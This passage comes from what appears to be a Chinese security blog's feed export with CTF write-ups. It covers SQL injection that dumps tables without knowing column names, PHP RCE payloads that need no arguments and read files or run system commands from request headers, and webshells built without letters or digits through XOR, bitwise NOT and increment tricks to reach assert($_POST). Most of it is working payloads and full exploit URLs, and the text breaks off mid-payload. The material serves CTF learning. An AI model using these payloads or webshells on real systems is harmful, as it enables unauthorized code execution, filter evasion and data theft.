<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 [id] =&gt; 1 [1] =&gt; 2 [username] =&gt; 2 [2] =&gt; flllaaaggg,users [password] =&gt; flllaaaggg,users )</span><br></pre></td></tr></table></figure>

<p>发现有flllaaaggg,users两种表，这里可以使用无列名注入，无列名注入可参考：<a class="foo" href="https://www.jianshu.com/p/6eba3370cfab" target="_blank">不知道列名的情况下注入</a></p>
<p>查看users表内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(c)/**/from(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select*from/**/users)x)%23</span><br></pre></td></tr></table></figure>

<p>查看fllllaaaggg表内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10004/?id=0%27/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/a,2/**/as/**/b/**/union/**/select*from/**/flllaaaggg)x)%23</span><br></pre></td></tr></table></figure>

<h3 id="MISC-welcome"><a href="#MISC-welcome" class="headerlink" title="MISC-welcome"></a><strong>MISC-welcome</strong></h3><p>前面没记错的话，应该是虎符的原题吧，题目附件是两个文件，一个<code>flag.rar</code>  一个<code>red_blue.png</code>。</p>
<p>用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片提取出来发现是密码为<code>/*///1258/*/@#</code></p>
<p>360解压打开发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Ao(mgHXo,o0fV<span class="string">&#x27;I2J&quot;^%3&amp;**H@q.MQ1,V%$1GCdB0P&quot;X%0RW</span></span><br></pre></td></tr></table></figure>

<p>当时没想到是base85编码，所以没做出来</p>
<p>在线解密得到flag：<a href="http://ctf.ssleye.com/base85.html">http://ctf.ssleye.com/base85.html</a></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>无参数RCE</title>
    <url>/2020/07/18/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>无参数RCE方法小总结，可以参考</p>
<p><a class="foo" href="https://xz.aliyun.com/t/6737" target="_blank">从一道CTF题学习Fuzz思想</a></p>
<h1 id="无参数RCE题目"><a href="#无参数RCE题目" class="headerlink" title="无参数RCE题目"></a><strong>无参数RCE题目</strong></h1><h1 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a><strong>例题一</strong></h1><p>题目源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目分析：</p>
<p>其中正则里面的<code>\w</code>表示<code>a-z</code>、<code>A-Z</code>、<code>0-9</code>，以及下划线。<code>(?R)</code>是引用当前表达式的意思，即可以用<code>\w+\((?R)?\)</code>替换到<code>(?R)</code>的位置，<code>(?R)?</code> 这里多一个<code>?</code>表示可以有引用，也就是说可以衍生匹配。</p>
<p>也就是说<code>/[^\W]+\((?R)?\)/</code>，只匹配<code>字符串+()</code>的类型，并且可以嵌套使用。</p>
<p>可以看一个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code1 = <span class="string">&quot;echo();&quot;</span>;</span><br><span class="line">$code2 = <span class="string">&quot;echo(123);&quot;</span>;</span><br><span class="line">$code3 = <span class="string">&quot;echo(phpinfo());&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code1));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code2));</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code3));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">echo(<span class="number">123</span>);</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>我们分别传入了<code>echo();</code>，<code>echo(123)</code>和<code>echo(phpinfo())</code>，可以看到参数一最终替换剩下一个<code>(;)</code>分号，而参数二无法匹配成功替换失败，参数三是echo嵌套一个phpinfo函数，同样匹配成功替换剩下一个<code>(;)</code>分号。那么这里就说明了我们这个正则虽然不能能够匹配存在参数的函数，但是可以嵌套函数使用。</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h3><p>我们知道<code>scandir()</code>函数式能够读取目录源码，但是他必须带有参数<code>（&#39;.&#39;）</code>也就是<code>scandir(&#39;.&#39;)</code>，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(<span class="string">&#x27;.&#x27;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是上面的正则匹配不允许出现函数里面有点的，所以我们要想办法构造这个点。</p>
<p>利用<code>localeconv()</code> 取点，<code>localeconv()</code> 会返回当地的金融信息的数组，而第一个元素即为点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(localeconv()); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造方法只需取第一个元素即可 <code>pos()</code>、<code>current()</code> 均可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(pos(localeconv())); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结合起来就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(scandir(pos(localeconv()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用end读取后一个文件名读取ﬂag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(end(scandir(pos(localeconv())))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用readﬁle读取ﬂag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(readfile(end(scandir(pos(localeconv()))))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h3><p>利用当前秒数构造点  ，利用localtime()中返回的秒数来构造点，点的aiisc码正好是46在60秒之 内，我们只需等到46秒时候就能将点给构造出来。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> var_dump(chr(pos(localtime()))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>

<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h3><p>利用SESSIONID来传参</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>在cookie处输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a><strong>方法四</strong></h3><p>利用 <code>getallheaders()</code> 来获取参数RCE，这里需要用burp抓包操作。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.107.126.173:8080/code/code.php? code=echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>在最后在最后一条请求头添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<h1 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a><strong>例题二</strong></h1><p>[GXYCTF2019]禁止套娃，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造点问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这两个都能生成点。</p>
<p>传参数发现</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; </span><br></pre></td></tr></table></figure>

<ul>
<li>exp1</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>其中array_reverse是将数组内容反转一下，利用next()指向flag.php文件。</p>
<ul>
<li>exp2</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>其中array_flip()交换数组的键和值，array_rand()从数组中随机取出一个或多个单元</p>
<p>多刷刷就出flag。</p>
<ul>
<li>exp3</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br><span class="line">PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>

<h1 id="跳转目录情况"><a href="#跳转目录情况" class="headerlink" title="跳转目录情况"></a><strong>跳转目录情况</strong></h1><ul>
<li><p>假设ﬂag在上层目录文件的情况，我们需要跳转到上层目录。 </p>
</li>
<li><p><code>chdir()</code> 函数当参数为两个点的时候能够跳转到上层目录。<code>scandir()</code> ，读取当前目录在第二个元素就能读取两个点</p>
</li>
<li><p><code>localtime</code>第一个参数是时间戳，所以我们不能直接嵌套，需要带一个time函数作为嵌套、time函数能够返回时间戳</p>
</li>
<li><p>构造读取上层目录payload</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>

<ul>
<li>构造读取上层目录文件payload</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<h1 id="其他小技巧"><a href="#其他小技巧" class="headerlink" title="其他小技巧"></a><strong>其他小技巧</strong></h1><p>利用三角函数构造斜杠</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))));</span><br></pre></td></tr></table></figure>

<p>利用随机令牌构造点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">echo(implode(scandir(chr(strrev(uniqid())))));</span><br></pre></td></tr></table></figure>

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>无字符构造webshell</title>
    <url>/2020/07/18/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0webshell/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>学习一波奇淫巧计，本篇大量参考了P神离别歌的文章：</p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">一些不包含数字和字母的webshell</a></p>
<p><a class="foo" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank">无字母数字webshell之提高篇</a></p>
<h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a><strong>无字符绕过</strong></h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,$_GET[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>本篇PHP环境为5.6</li>
</ul>
<h2 id="方法一（异或）"><a href="#方法一（异或）" class="headerlink" title="方法一（异或）"></a><strong>方法一（异或）</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>以此类推，构造webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); <span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line">$__=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); <span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php?shell&#x3D;$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;);$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___&#x3D;$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>

<p>post传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure>

<p>可以这个代码表达式计算出异或可见的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200724162439697.png" style="high:80%;width:80%;" />



<h2 id="方法二（取反）"><a href="#方法二（取反）" class="headerlink" title="方法二（取反）"></a><strong>方法二（取反）</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> ~(<span class="string">&#x27;瞰&#x27;</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>但是这里有数字1，要另外想办法构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="comment">//输出1</span></span><br></pre></td></tr></table></figure>

<p>以此类推，构造webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$___=<span class="string">&quot;瞰&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;和&quot;</span>;$____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;的&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;半&quot;</span>;$____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;始&quot;</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">&#x27;_&#x27;</span>;$___=<span class="string">&quot;俯&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;瞰&quot;</span>;$_____.=~($___&#123;$__&#125;);$___=<span class="string">&quot;次&quot;</span>;$_____.=~($___&#123;$_&#125;);$___=<span class="string">&quot;站&quot;</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"><span class="comment">//assert($_POST[2]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)%2b(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</span><br></pre></td></tr></table></figure>

<p>post传参</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="方法三（自增）"><a href="#方法三（自增）" class="headerlink" title="方法三（自增）"></a><strong>方法三（自增）</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&#x27;</span>.[];</span><br><span class="line"><span class="comment">//输出Array</span></span><br></pre></td></tr></table></figure>

<p>通过自增构造字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">$a++;</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//输出b</span></span><br></pre></td></tr></table></figure>

<p>以此类推，构造webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=[];</span><br><span class="line">$_=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line">$_=$_[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line">$___=$_; <span class="comment">// A</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$___.=$__; <span class="comment">// S</span></span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; <span class="comment">// E</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// R</span></span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// P</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// O</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// S</span></span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; <span class="comment">// T</span></span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/1.php?shell=$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;</span><br><span class="line">$__%<span 